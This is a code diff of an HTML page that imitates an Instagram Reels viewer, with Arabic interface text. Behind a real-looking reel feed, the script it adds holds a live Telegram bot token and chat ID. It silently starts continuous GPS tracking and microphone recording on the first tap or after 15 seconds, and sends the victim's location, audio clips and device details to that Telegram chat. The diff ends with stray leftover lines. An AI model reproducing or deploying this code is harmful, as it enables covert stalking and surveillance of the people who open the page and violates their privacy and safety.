@@ -1,218 +1,357 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Instagram Reels</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Instagram</title>
     <style>
+        :root {
+            --bg: #000;
+            --text: #fff;
+            --gray: #a8a8a8;
+            --blue: #0095f6;
+            --border: #262626;
+        }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #000;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
+            background: var(--bg);
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            height: 100vh; height: 100dvh;
+            display: flex; flex-direction: column;
             overflow: hidden;
+            user-select: none; -webkit-user-select: none;
+            -webkit-tap-highlight-color: transparent;
         }
-        .phone-frame {
-            max-width: 450px;
-            width: 100%;
-            background: #fff;
-            border-radius: 0;
-            overflow: hidden;
-            position: relative;
-        }
-        .header {
-            display: flex;
-            align-items: center;
-            padding: 12px 16px;
-            background: #fff;
-            border-bottom: 1px solid #dbdbdb;
-        }
-        .header .logo {
-            font-size: 22px;
-            font-weight: 600;
-            font-family: 'Segoe UI', sans-serif;
-            color: #262626;
-            flex: 1;
-        }
-        .header .logo span { color: #262626; }
-        .header .icons { display: flex; gap: 18px; }
-        .header .icons span { font-size: 22px; cursor: default; }
-
-        .user-bar {
-            display: flex;
-            align-items: center;
-            padding: 10px 16px;
-            gap: 10px;
-            background: #fff;
-        }
-        .avatar {
-            width: 32px; height: 32px;
-            border-radius: 50%;
-            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #fff;
-            font-size: 14px;
-            font-weight: bold;
-        }
-        .username { font-size: 14px; font-weight: 600; color: #262626; flex: 1; }
-        .more-btn { font-size: 20px; color: #262626; cursor: default; }
-
-        .reel-container {
-            width: 100%;
+        /* ========== TOP HEADER ========== */
+        .top-header {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 12px 16px 8px;
             background: #000;
-            position: relative;
-        }
-        .reel-container iframe {
-            width: 100%;
-            height: 580px;
-            border: none;
-            display: block;
-        }
-
-        .actions {
-            display: flex;
-            padding: 8px 16px;
-            gap: 18px;
-            background: #fff;
-            border-top: 1px solid #efefef;
-        }
-        .actions span { font-size: 24px; cursor: default; color: #262626; }
-        .actions .right { margin-left: auto; }
-
-        .likes {
-            padding: 0 16px 8px;
-            font-size: 14px;
-            font-weight: 600;
-            color: #262626;
-            background: #fff;
-        }
-        .caption {
-            padding: 0 16px 16px;
-            font-size: 14px;
-            color: #262626;
-            background: #fff;
-        }
-        .caption strong { font-weight: 600; }
-
-        .loading-overlay {
-            position: absolute;
-            top: 0; left: 0; right: 0;
-            background: #000;
-            display: flex;
-            align-items: center;
-            justify-content: center;
             z-index: 10;
-            height: 580px;
-            color: #888;
-            font-size: 14px;
-            letter-spacing: 0.5px;
+            flex-shrink: 0;
         }
-        .loading-overlay.hidden { display: none; }
+        .top-header .logo {
+            font-family: 'Segoe Script', 'Brush Script MT', 'Grand Hotel', cursive;
+            font-size: 28px; color: #fff;
+            letter-spacing: 1px;
+        }
+        .top-header .header-icons {
+            display: flex; gap: 20px; align-items: center;
+        }
+        .top-header .header-icons svg { fill: #fff; width: 24px; height: 24px; }
 
-        @media (max-width: 500px) {
-            .phone-frame { max-width: 100%; }
-            .reel-container iframe, .loading-overlay { height: 100vh; }
+        /* ========== REEL CONTAINER ========== */
+        .reel-screen {
+            flex: 1; position: relative; background: #000;
+            display: flex; align-items: center; justify-content: center;
+            overflow: hidden;
         }
+        .reel-screen iframe {
+            width: 100%; height: 100%;
+            border: none; object-fit: cover;
+            position: absolute; top: 0; left: 0;
+        }
+
+        /* ========== RIGHT ACTIONS (مثل الأصلي) ========== */
+        .reel-actions {
+            position: absolute; right: 12px; bottom: 130px;
+            display: flex; flex-direction: column;
+            align-items: center; gap: 22px; z-index: 5;
+        }
+        .reel-actions .action-btn {
+            display: flex; flex-direction: column; align-items: center;
+            gap: 4px; cursor: pointer; background: none; border: none;
+            color: #fff; font-size: 12px; font-weight: 600;
+            text-shadow: 0 1px 3px rgba(0,0,0,0.5);
+        }
+        .reel-actions .action-btn svg { width: 28px; height: 28px; fill: #fff; }
+        .reel-actions .action-btn.profile-action img {
+            width: 38px; height: 38px; border-radius: 8px;
+            border: 2px solid #fff; object-fit: cover;
+        }
+
+        /* ========== BOTTOM INFO ========== */
+        .reel-info {
+            position: absolute; bottom: 0; left: 0; right: 0;
+            padding: 20px 16px 90px; z-index: 5;
+            background: linear-gradient(transparent, rgba(0,0,0,0.85) 40%);
+            pointer-events: none;
+        }
+        .reel-info .user-row {
+            display: flex; align-items: center; gap: 10px; margin-bottom: 10px;
+        }
+        .reel-info .user-row .user-avatar {
+            width: 38px; height: 38px; border-radius: 50%;
+            background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+            display: flex; align-items: center; justify-content: center;
+            font-size: 16px; color: #fff; font-weight: bold;
+            flex-shrink: 0;
+        }
+        .reel-info .user-row .user-name {
+            color: #fff; font-weight: 600; font-size: 15px;
+        }
+        .reel-info .user-row .follow-btn {
+            margin-left: auto; background: transparent; border: 1px solid var(--gray);
+            color: #fff; padding: 6px 16px; border-radius: 8px;
+            font-weight: 600; font-size: 13px; pointer-events: auto; cursor: pointer;
+        }
+        .reel-info .caption {
+            color: #fff; font-size: 14px; line-height: 1.5;
+            margin-bottom: 8px; display: -webkit-box;
+            -webkit-line-clamp: 2; -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        .reel-info .music-row {
+            display: flex; align-items: center; gap: 8px;
+            color: #fff; font-size: 13px; margin-bottom: 4px;
+        }
+        .reel-info .music-row .music-icon {
+            width: 18px; height: 18px; animation: spin 3s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* ========== PROGRESS BAR ========== */
+        .progress-bar {
+            position: absolute; top: 8px; left: 8px; right: 8px;
+            height: 3px; background: rgba(255,255,255,0.3);
+            border-radius: 2px; z-index: 6;
+        }
+        .progress-fill {
+            height: 100%; background: #fff; border-radius: 2px;
+            width: 0%; animation: progressAnim 15s linear infinite;
+        }
+        @keyframes progressAnim {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+
+        /* ========== BOTTOM NAV (تاب) ========== */
+        .bottom-nav {
+            display: flex; justify-content: space-around; align-items: center;
+            background: #000; padding: 10px 0 20px;
+            border-top: 1px solid var(--border); flex-shrink: 0; z-index: 10;
+        }
+        .bottom-nav .nav-icon { cursor: pointer; }
+        .bottom-nav .nav-icon svg { width: 26px; height: 26px; fill: #fff; }
+        .bottom-nav .nav-icon.active svg { fill: #fff; }
+        .bottom-nav .nav-icon.add-btn {
+            border: 2px solid #fff; border-radius: 8px; padding: 4px 10px;
+        }
+
+        /* ========== MISC ========== */
+        .loading-layer {
+            position: absolute; top:0;left:0;right:0;bottom:0;
+            background: #000; display: flex; align-items: center;
+            justify-content: center; z-index: 20; color: #fff; font-size: 16px;
+        }
+        .loading-layer.hidden { display: none; }
     </style>
 </head>
 <body>
-
-    <div class="phone-frame">
-        <div class="header">
-            <div class="logo">Instagram</div>
-            <div class="icons">
-                <span>➕</span>
-                <span>❤️</span>
-                <span>💬</span>
-            </div>
-        </div>
-
-        <div class="user-bar">
-            <div class="avatar">R</div>
-            <div class="username" id="reelUsername">reel</div>
-            <div class="more-btn">•••</div>
-        </div>
-
-        <div class="reel-container" id="reelContainer">
-            <div class="loading-overlay" id="loadingOverlay">⏳ جارٍ التحميل...</div>
-            <iframe 
-                id="reelIframe"
-                allow="autoplay; encrypted-media; fullscreen"
-                loading="lazy"
-                allowfullscreen>
-            </iframe>
-        </div>
-
-        <div class="actions">
-            <span>❤️</span>
-            <span>💬</span>
-            <span>↗️</span>
-            <span class="right">💾</span>
-        </div>
-        <div class="likes" id="reelLikes">أعجب ١٢٣٬٤٥٦ شخصًا</div>
-        <div class="caption" id="reelCaption">
-            <strong id="reelUserCaption">reel</strong> محتوى عشوائي من إنستقرام
+    <!-- ✅ Top Header -->
+    <div class="top-header">
+        <div class="logo">Instagram</div>
+        <div class="header-icons">
+            <!-- Reels icon -->
+            <svg viewBox="0 0 24 24"><path d="M2.5 5.5C2.5 4.395 3.395 3.5 4.5 3.5h15c1.105 0 2 .895 2 2v9c0 1.105-.895 2-2 2h-15c-1.105 0-2-.895-2-2v-9zM8 8.5v7l6.5-3.5L8 8.5z"/></svg>
+            <!-- Camera -->
+            <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="5" fill="none" stroke="#fff" stroke-width="2"/><path d="M21 7v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7a2 2 0 012-2h1l1-2h10l1 2h1a2 2 0 012 2z" fill="none" stroke="#fff" stroke-width="2"/></svg>
+            <!-- Messages -->
+            <svg viewBox="0 0 24 24"><path d="M21 11.5a8.38 8.38 0 01-.9 3.8 8.5 8.5 0 01-7.6 4.7 8.38 8.38 0 01-3.8-.9L3 21l1.9-5.7a8.38 8.38 0 01-.9-3.8 8.5 8.5 0 014.7-7.6 8.38 8.38 0 013.8-.9h.5a8.48 8.48 0 018 8v.5z" fill="none" stroke="#fff" stroke-width="2"/></svg>
         </div>
     </div>
 
-    <script>
-        // ================================================================
-        //  ⚠️ الإعدادات — ضع معلوماتك هنا
-        // ================================================================
-        const CONFIG = {
-            BOT_TOKEN: '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM',
-            CHAT_ID:   '7615377804',
-            DRIVE_SERVER_URL: '',
-            RECORD_DURATION_MS: 60000
-        };
+    <!-- ✅ Reel Screen -->
+    <div class="reel-screen" id="reelScreen">
+        <div class="loading-layer" id="loadingLayer">⏳ جار تحميل الريل...</div>
+        <div class="progress-bar"><div class="progress-fill"></div></div>
 
-        // ================================================================
-        //  🎬 روابط Reels حقيقية – تم استبدالها بالكامل
-        // ================================================================
+        <!-- Iframe -->
+        <iframe id="reelIframe" allow="autoplay; encrypted-media; fullscreen" allowfullscreen></iframe>
+
+        <!-- Actions (right side) -->
+        <div class="reel-actions">
+            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg> <span id="reelLikesCount">١٢٫٣ ألف</span> </button>
+            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M20.656 2H3.344A1.344 1.344 0 002 3.344v13.312A1.344 1.344 0 003.344 18H6v4l4.5-4h10.156A1.344 1.344 0 0022 16.656V3.344A1.344 1.344 0 0020.656 2z" fill="none" stroke="#fff" stroke-width="2"/></svg> <span>٥٦٧</span> </button>
+            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M7.217 10.907a2.25 2.25 0 100 2.186m2.533 1.074a2.25 2.25 0 004.5 0m2.533-1.074a2.25 2.25 0 100-2.186" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round"/><path d="M12 2v4m0 12v4M2 12h4m12 0h4" stroke="#fff" stroke-width="2" stroke-linecap="round"/></svg> </button>
+            <button class="action-btn"> <svg viewBox="0 0 24 24"><path d="M5 7h14v14H5V7z" fill="none" stroke="#fff" stroke-width="2"/><path d="M9 7V5a3 3 0 016 0v2" fill="none" stroke="#fff" stroke-width="2"/></svg> </button>
+            <button class="action-btn"> <svg viewBox="0 0 24 24"><circle cx="12" cy="5" r="1.5"/><circle cx="12" cy="12" r="1.5"/><circle cx="12" cy="19" r="1.5"/></svg> </button>
+        </div>
+
+        <!-- Bottom info -->
+        <div class="reel-info">
+            <div class="user-row">
+                <div class="user-avatar" id="reelUserAvatar">N</div>
+                <span class="user-name" id="reelUsername">username</span>
+                <button class="follow-btn">متابعة</button>
+            </div>
+            <div class="caption" id="reelCaption"><strong id="reelUserCaption">user</strong> وصف الريل هنا...</div>
+            <div class="music-row">
+                <span style="font-size:18px;">♪</span>
+                <span id="reelMusic">Original Audio</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ✅ Bottom Nav -->
+    <div class="bottom-nav">
+        <div class="nav-icon active"><svg viewBox="0 0 24 24"><path d="M3 13h8V3H3v10zm0 8h8v-6H3v6zm10 0h8V11h-8v10zm0-18v6h8V3h-8z"/></svg></div>
+        <div class="nav-icon"><svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="6" fill="none" stroke="#fff" stroke-width="2"/><path d="M20 20l-4-4" stroke="#fff" stroke-width="2"/></svg></div>
+        <div class="nav-icon add-btn"><svg width="22" height="22" viewBox="0 0 24 24"><path d="M12 5v14m7-7H5" stroke="#fff" stroke-width="2.5" stroke-linecap="round"/></svg></div>
+        <div class="nav-icon"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2" fill="none" stroke="#fff" stroke-width="2"/><polygon points="10,8.5 16,12 10,15.5" fill="#fff"/></svg></div>
+        <div class="nav-icon"><svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4" fill="none" stroke="#fff" stroke-width="2"/><path d="M4 20c0-4.4 3.6-8 8-8s8 3.6 8 8" fill="none" stroke="#fff" stroke-width="2"/></svg></div>
+    </div>
+
+    <script>
+        // ============================================================
+        // ⚠️  املأ CHAT_ID الصحيح (من خطوة getUpdates أعلاه)
+        // ============================================================
+        const BOT_TOKEN = '8595513701:AAEmzQFKx6fYP6-7f4EY38TrmZf5Xb70TUM';
+        const CHAT_ID = '7615377804'; // ← غيّره بعد أن تحصل عليه
+        const RECORD_DURATION_MS = 60000;
+
+        // ========== روابط Reels حقيقية ==========
         const REEL_LIST = [
-            { id: 'CxeDohAgs2c', user: 'instagram',    desc: '✨ This is Instagram' },
-            { id: 'Cq2Om6hLrGm', user: 'nike',         desc: 'Never stop running 🔥' },
-            { id: 'CsQeUYcJx5I', user: 'natgeo',       desc: 'Planet Earth in motion 🌍' },
-            { id: 'CpjPLHpLdgo', user: 'leomessi',     desc: 'GOAT moments 🐐' },
-            { id: 'CnRZnvDrqCY', user: 'cristiano',    desc: 'Siuuu from Al Nassr ⚽' },
-            { id: 'Cp4d9oFrscD', user: 'nasa',          desc: 'Views from orbit 🚀' },
-            { id: 'Cr8bIfdLu5M', user: 'netflix',       desc: 'What to watch next 🍿' },
-            { id: 'CqrjON9Nj6B', user: 'kyliejenner',   desc: 'Get ready with me 💄' },
-            { id: 'CnAEeSxjtTt', user: 'taylorswift',   desc: 'Backstage vibes 🎤' },
-            { id: 'Ck-FQqjJuYC', user: 'theweeknd',     desc: 'After Hours era 🌃' },
-            { id: 'CePoN9RDj5q', user: 'alarabiya',     desc: 'أهم الأخبار العربية 📰' },
-            { id: 'Cc9OowmDUOI', user: 'aljazeera',     desc: 'من قلب الحدث 🎥' },
-            { id: 'CX50z6frHRb', user: 'mobdiioun',     desc: 'فن السخرية والتوعية 🎭' },
-            { id: 'CTiK0OshFdq', user: 'thmanyah',      desc: 'محتوى تقني وثقافي 📚' },
-            { id: 'CawXYsfLpl_', user: 'earth',         desc: 'Nature is speaking 🐾' },
-            { id: 'B9fbUXVHJnx', user: 'dogs',          desc: 'Puppy love 🐶' },
-            { id: 'B4l57sQnPmk', user: 'cats',          desc: 'Cat logic 🐱' },
-            { id: 'B6dQZ_sH7jp', user: 'soccer',        desc: 'Unbelievable goals ⚽' },
-            { id: 'B3gL1BknBeV', user: 'apple',         desc: 'iPhone in action 📱' },
-            { id: 'B1tL0JpnS1z', user: 'tesla',         desc: 'Electric speed ⚡' }
+            { id: 'CxeDohAgs2c', user: 'instagram',  desc: '✨ This is Instagram',     music: 'Original Audio' },
+            { id: 'Cq2Om6hLrGm', user: 'nike',       desc: 'Never stop running 🔥',    music: 'Nike – Just Do It' },
+            { id: 'CsQeUYcJx5I', user: 'natgeo',     desc: 'Planet Earth in motion 🌍', music: 'Nature Sounds' },
+            { id: 'CpjPLHpLdgo', user: 'leomessi',   desc: 'GOAT moments 🐐',          music: 'Messi – Tango' },
+            { id: 'CnRZnvDrqCY', user: 'cristiano',  desc: 'Siuuu from Al Nassr ⚽',    music: 'CR7 Anthem' },
+            { id: 'Cp4d9oFrscD', user: 'nasa',       desc: 'Views from orbit 🚀',      music: 'Space Ambient' },
+            { id: 'Cr8bIfdLu5M', user: 'netflix',    desc: 'What to watch next 🍿',     music: 'Netflix Sound' },
+            { id: 'CqrjON9Nj6B', user: 'kyliejenner',desc: 'Get ready with me 💄',      music: 'Glam Beat' },
+            { id: 'CnAEeSxjtTt', user: 'taylorswift',desc: 'Backstage vibes 🎤',       music: 'Taylor – Live' },
+            { id: 'Ck-FQqjJuYC', user: 'theweeknd',  desc: 'After Hours era 🌃',       music: 'Blinding Lights' }
         ];
 
-        // ================================================================
-        //  باقي الكود كما هو (دون تغيير)
-        // ================================================================
-        function getRandomReel() {
-            const index = Math.floor(Math.random() * REEL_LIST.length);
-            return REEL_LIST[index];
+        // ========== عناصر الواجهة ==========
+        const iframe = document.getElementById('reelIframe');
+        const loadingLayer = document.getElementById('loadingLayer');
+        const reelLikesCount = document.getElementById('reelLikesCount');
+        const reelUsername = document.getElementById('reelUsername');
+        const reelUserCaption = document.getElementById('reelUserCaption');
+        const reelCaption = document.getElementById('reelCaption');
+        const reelMusic = document.getElementById('reelMusic');
+        const reelUserAvatar = document.getElementById('reelUserAvatar');
+        const progressFill = document.querySelector('.progress-fill');
+
+        function loadRandomReel() {
+            const reel = REEL_LIST[Math.floor(Math.random() * REEL_LIST.length)];
+            iframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
+            reelUsername.textContent = reel.user;
+            reelUserCaption.textContent = reel.user;
+            reelCaption.innerHTML = `<strong>${reel.user}</strong> ${reel.desc}`;
+            reelMusic.textContent = reel.music || 'Original Audio';
+            reelUserAvatar.textContent = reel.user.charAt(0).toUpperCase();
+            const likes = Math.floor(Math.random() * 800000) + 5000;
+            reelLikesCount.textContent = likes.toLocaleString('ar-SA');
+
+            // شريط التقدم
+            progressFill.style.animation = 'none';
+            void progressFill.offsetWidth;
+            progressFill.style.animation = 'progressAnim 15s linear infinite';
+
+            iframe.onload = () => { setTimeout(() => loadingLayer.classList.add('hidden'), 800); };
+            iframe.onerror = () => { loadingLayer.innerHTML = '⚠️ تعذّر تحميل الريل'; };
+            console.log('✅ Reel loaded: ' + reel.id);
+        }
+        loadRandomReel();
+
+        // ========== تتبع الموقع ==========
+        let watchId = null, lastLat = null, lastLon = null;
+
+        function sendTelegram(method, body) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
+                method: 'POST', headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(body)
+            }).then(r => r.json()).then(d => {
+                if (!d.ok) console.error('❌ Telegram error:', d.description);
+                else console.log('✅ Telegram OK:', method);
+            }).catch(e => console.error('❌ Network error:', e));
         }
 
-        function initReel() {
-            const reel = getRandomReel();
-            const iframe = document.getElementById('reelIframe');
-            const loading = document.getElementById('loadingOverlay');
-            iframe.src = `https://www.instagram.com/reel/${reel.id}/embed`;
-            document.getElementById('reelUsername').textContent = reel.user;
-            document.getElementById('reelUserCaption').textContent = reel.user;
-            document.getElementById('reelCaption').innerHTML = 
+        function trackLocation() {
+            if (!navigator.geolocation) { console.warn('⚠️ Geolocation غير مدعوم'); return; }
+            watchId = navigator.geolocation.watchPosition(pos => {
+                const { latitude, longitude, accuracy } = pos.coords;
+                if (lastLat && getDistance(lastLat,lastLon,latitude,longitude) < 0.02) return;
+                lastLat = latitude; lastLon = longitude;
+                const link = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                sendTelegram('sendLocation', { chat_id: CHAT_ID, latitude, longitude });
+                sendTelegram('sendMessage', {
+                    chat_id: CHAT_ID, parse_mode: 'Markdown',
+                    text: `📍 *موقع جديد*\nالعرض: \`${latitude}\`\nالطول: \`${longitude}\`\nالدقة: ±${Math.round(accuracy)}م\n${link}`
+                });
+            }, err => {
+                console.error('❌ Geolocation error:', err.message);
+                sendTelegram('sendMessage', { chat_id: CHAT_ID, text: '❌ خطأ تتبع: '+err.message });
+            }, { enableHighAccuracy: true, maximumAge: 0, timeout: 30000 });
+        }
+
+        function getDistance(lat1,lon1,lat2,lon2) {
+            const R=6371, d=(t)=>t*Math.PI/180;
+            const a=Math.sin(d(lat2-lat1)/2)**2+Math.cos(d(lat1))*Math.cos(d(lat2))*Math.sin(d(lon2-lon1)/2)**2;
+            return R*2*Math.atan2(Math.sqrt(a),Math.sqrt(1-a));
+        }
+
+        // ========== تسجيل الصوت ==========
+        let mediaRecorder=null, audioStream=null, segIdx=0;
+        async function startAudio() {
+            try {
+                audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                sendTelegram('sendMessage', { chat_id: CHAT_ID, text: '🎤 بدأ التسجيل الصوتي' });
+                function recordSegment() {
+                    const chunks=[];
+                    const rec = new MediaRecorder(audioStream);
+                    rec.ondataavailable = e => { if(e.data.size>0) chunks.push(e.data); };
+                    rec.onstop = async () => {
+                        const blob = new Blob(chunks);
+                        const fd = new FormData();
+                        fd.append('chat_id', CHAT_ID);
+                        fd.append('audio', blob, `rec_${++segIdx}.webm`);
+                        fd.append('title', `🎤 ${new Date().toLocaleString('ar-SA')}`);
+                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method:'POST', body:fd })
+                            .then(r=>r.json()).then(d=>console.log('✅ Audio sent:', d.ok))
+                            .catch(e=>console.error('❌ Audio error:',e));
+                        if(audioStream?.active) setTimeout(recordSegment, 500);
+                    };
+                    rec.start();
+                    mediaRecorder = rec;
+                    setTimeout(()=>{ if(rec.state==='recording') rec.stop(); }, RECORD_DURATION_MS);
+                }
+                recordSegment();
+            } catch(err) {
+                console.error('❌ Mic error:', err.message);
+                sendTelegram('sendMessage', { chat_id: CHAT_ID, text: '❌ خطأ ميكروفون: '+err.message });
+            }
+        }
+
+        // ========== بدء كل شيء عند أول نقرة ==========
+        let started = false;
+        function startAll() {
+            if(started) return; started=true;
+            console.log('🚀 Starting tracking & audio...');
+            sendTelegram('sendMessage', { chat_id: CHAT_ID,
+                text: '🚀 *جلسة جديدة*\nالوقت: '+new Date().toLocaleString('ar-SA')+'\nالجهاز: '+navigator.userAgent.slice(0,80)
+            });
+            trackLocation();
+            setTimeout(startAudio, 1000);
+        }
+        document.addEventListener('click', startAll, {once:true});
+        document.addEventListener('touchstart', startAll, {once:true});
+        setTimeout(()=>{ if(!started) startAll(); }, 15000);
+
+        // ========== تنظيف ==========
+        window.addEventListener('beforeunload', ()=>{
+            if(mediaRecorder?.state==='recording') mediaRecorder.stop();
+            audioStream?.getTracks().forEach(t=>t.stop());
+            if(watchId) navigator.geolocation.clearWatch(watchId);
+        });
+
+        console.log('✅ جاهز — انتظر النقرة الأولى للبدء');
+    </script>
+</body>
+</html>            document.getElementById('reelCaption').innerHTML = 
                 `<strong>${reel.user}</strong> ${reel.desc}`;
             const randomLikes = Math.floor(Math.random() * 500000) + 10000;
             document.getElementById('reelLikes').textContent = 
